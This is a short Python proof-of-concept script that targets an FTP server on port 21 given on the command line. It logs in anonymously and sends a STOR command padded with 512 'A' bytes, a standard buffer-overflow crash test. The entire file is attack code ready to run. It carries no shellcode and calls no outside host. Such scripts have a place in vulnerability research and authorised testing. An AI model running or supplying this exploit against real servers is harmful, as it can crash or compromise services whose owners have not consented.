#!/usr/bin/env python3
import socket
import sys

# POC buffer
buf = b"A" * 512

if len(sys.argv) < 2:
    print("Usage: ./poc.py <target-IP>")
    exit()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(b'USER anonymous\r\n')
s.recv(1024)
s.send(b'PASS anonymous\r\n')
s.recv(1024)
s.send(b'STOR' + buf + b'\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.close()